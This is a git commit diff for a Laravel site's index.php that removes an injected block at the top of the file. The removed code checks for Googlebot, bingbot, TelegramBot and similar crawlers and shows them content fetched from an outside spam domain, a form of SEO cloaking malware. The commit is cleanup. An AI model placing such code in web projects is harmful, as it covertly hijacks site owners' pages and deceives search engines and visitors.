3da47a45c0c5404e43d265b12dcef9ffb3af8bc0
marcozz <koitoto.diotarigan@gmail.com>
2024-07-18 19:38:31 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,23 +1,4 @@
 <?php
-function is_bot() {
-    $user_agent = $_SERVER['HTTP_USER_AGENT'];
-    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
-    
-    foreach ($bots as $bot) {
-        if (stripos($user_agent, $bot) !== false) {
-            return true;
-        }
-    }
-    
-    return false;
-}
-
-if (is_bot()) {
-    $message = file_get_contents('https://amp-saya.com/brand/kikototo/coralreefrescueinitiative.org/index.txt');#NAROLINK
-    echo $message;
-}
-?>
-<?php
 
 /**
  * Laravel - A PHP Framework For Web Artisans.
